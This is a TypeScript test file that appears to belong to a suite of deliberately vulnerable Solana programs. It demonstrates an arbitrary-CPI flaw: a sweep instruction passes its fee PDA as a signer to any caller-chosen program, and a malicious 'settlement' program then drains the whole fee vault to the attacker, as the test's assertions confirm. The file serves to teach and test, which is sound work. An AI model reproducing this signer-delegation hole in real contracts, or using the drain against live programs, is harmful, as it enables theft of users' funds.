/**
 * VULN 05 — Arbitrary CPI with PDA signer delegation (native program).
 *
 * sweep() delegates fee settlement to ANY program the caller passes and
 * hands it the [b"fees"] PDA as a signer. The attacker deploys a malicious
 * "settlement program" (mode 2 of the attacker program) that uses the
 * delegated authority to move the entire fee vault into their own token
 * account. The intended treasury account is simply ignored.
 */
import { assert } from "chai";
import {
  PROG_IDS, provider, connection, findPda, seedsBuf, airdrop, newFundedKeypair,
  createMint, createAccount, mintTo, tokenBalance, nativeIx, sendTx, sendSelfSigned,
  TOKEN_PROGRAM_ID, Keypair,
} from "./util";

describe("vuln05 arbitrary CPI / signer delegation", () => {
  const feePda = findPda([seedsBuf("fees")[0]], PROG_IDS.vuln05)[0];

  let mint: any, feeVault: any, attackerAta: any, treasuryDummy: any;
  let attacker: any;

  before(async () => {
    await airdrop(provider.wallet.publicKey, 50);
    attacker = await newFundedKeypair(30);

    mint = await createMint(provider.connection, provider.wallet.payer, provider.wallet.publicKey, null, 6);
    attackerAta = await createAccount(provider.connection, provider.wallet.payer, mint, attacker.publicKey);
    // A second (unrelated) token account used as the "intended destination";
    // must be a NON-associated account, hence an explicit keypair.
    treasuryDummy = await createAccount(provider.connection, provider.wallet.payer, mint, attacker.publicKey, Keypair.generate());

    // Fee vault is an SPL token account owned by the fee PDA (deployer setup).
    // NOTE: an explicit keypair is required — without one spl-token falls
    // back to associated-token-account creation, which a PDA owner can't use.
    feeVault = await createAccount(provider.connection, provider.wallet.payer, mint, feePda, Keypair.generate());
    await mintTo(provider.connection, provider.wallet.payer, mint, feeVault, provider.wallet.publicKey, 500);
  });

  it("honest no-op settlement leaves the vault untouched", async () => {
    // The attacker program with mode 0 acts as a harmless settlement
    // program: it returns Ok and moves nothing.
    await sendSelfSigned(
      [
        nativeIx(
          PROG_IDS.vuln05, 1, Buffer.from([0]), // plan 0: honest no-op settlement
          [
            { pubkey: feePda, isSigner: false, isWritable: false },
            { pubkey: PROG_IDS.attacker, isSigner: false, isWritable: false }, // settlement program
            { pubkey: feeVault, isSigner: false, isWritable: true },
            { pubkey: treasuryDummy, isSigner: false, isWritable: false },
            { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
          ],
        ),
      ],
      attacker,
    );
    assert.equal((await tokenBalance(feeVault)).toString(), "500");
  });

  it("malicious settlement program drains the fee vault via delegated PDA", async () => {
    // The attacker passes their own ATA as an "extra" account. The vulnerable
    // distributor blindly forwards it together with the PDA signature.
    await sendSelfSigned(
      [
        nativeIx(
          PROG_IDS.vuln05, 1, Buffer.from([2]), // plan 2: the malicious "settlement" steals
          [
            { pubkey: feePda, isSigner: false, isWritable: false },
            { pubkey: PROG_IDS.attacker, isSigner: false, isWritable: false }, // MALICIOUS settlement program
            { pubkey: feeVault, isSigner: false, isWritable: true },
            { pubkey: treasuryDummy, isSigner: false, isWritable: false },
            { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
            { pubkey: attackerAta, isSigner: false, isWritable: true }, // extra -> steal destination
          ],
        ),
      ],
      attacker,
    );

    assert.equal((await tokenBalance(attackerAta)).toString(), "500");
    assert.equal((await tokenBalance(feeVault)).toString(), "0");
  });
});
